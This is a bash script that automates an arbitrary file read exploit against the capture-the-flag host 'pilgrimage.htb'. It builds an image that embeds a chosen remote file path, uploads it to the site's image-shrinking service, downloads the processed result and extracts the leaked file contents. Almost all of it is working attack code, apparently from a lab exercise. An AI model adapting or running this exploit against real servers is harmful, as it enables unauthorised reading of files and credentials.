#!/bin/bash


if [ $# -ne 2 ];then
	echo "Usage $0 <output Image file> <remote file path>";exit
fi

echo "Generating Image"

python3 generate.py -f "$2" -o "$1"

echo "Uploading Image"
url=$(curl --silent -F "toConvert=@${1}" "http://pilgrimage.htb/" -X POST -i | grep -o -E "http://pilgrimage.htb/shrunk/[0-9a-zA-Z]+\.png")

echo "Downloading $url"

curl --silent -o result.png "$url"

echo "Converting..."

convert result.png output.png
echo "Extracting ....."
echo
echo

./extract.sh output.png


#rm "$1" result.png output.png
